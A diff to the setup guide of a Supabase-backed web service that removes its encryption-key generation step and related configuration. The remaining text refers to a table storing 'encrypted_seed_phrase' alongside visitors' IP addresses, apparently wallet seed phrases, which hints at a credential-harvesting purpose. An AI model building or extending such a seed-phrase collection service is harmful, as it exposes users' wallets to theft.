@@ -54,32 +54,8 @@ SUPABASE_URL=https://xyzabc.supabase.co
 SUPABASE_ANON_KEY=eyJhbGciOiJIUzI1NiIs...
 ```
 
-## Step 4: Generate an Encryption Key
 
-The backend uses AES encryption with `ENCRYPTION_KEY`. Generate a secure 32+ character key:
-
-**Option A: Using Node.js**
-```bash
-node -e "console.log(require('crypto').randomBytes(32).toString('hex'))"
-```
-
-**Option B: Using OpenSSL**
-```bash
-openssl rand -hex 32
-```
-
-**Option C: Python**
-```python
-import secrets
-print(secrets.token_hex(32))
-```
-
-Example output:
-```
-a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6q7r8s9t0u1v2w3x4y5z6a7b8c9d0e1f
-```
-
-## Step 5: Configure Environment Variables Locally
+## Step 4: Configure Environment Variables Locally
 
 Create a `.env.local` file in your project root:
 
@@ -87,9 +63,6 @@ Create a `.env.local` file in your project root:
 # Supabase Configuration
 SUPABASE_URL=https://xyzabc.supabase.co
 SUPABASE_ANON_KEY=eyJhbGciOiJIUzI1NiIs...
-
-# Encryption Configuration (32+ chars)
-ENCRYPTION_KEY=a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6q7r8s9t0u1v2w3x4y5z6a7b8c9d0e1f
 
 # SendGrid (optional, for contact form)
 SENDGRID_API_KEY=SG.your_key_here
@@ -184,9 +157,7 @@ export default async function handler(req, res) {
 - Check that `SUPABASE_URL` and `SUPABASE_ANON_KEY` are set in environment
 - Verify credentials in Supabase dashboard API settings
 
-**Issue: "Encryption failed"**
-- Ensure `ENCRYPTION_KEY` is set to 32+ character string
-- Check that crypto-js is installed: `npm list crypto-js`
+
 
 **Issue: "Insert failed" in Supabase**
 - Verify table schema matches expected columns: `id`, `type`, `encrypted_seed_phrase`, `created_at`, `ip_address`, `metadata`
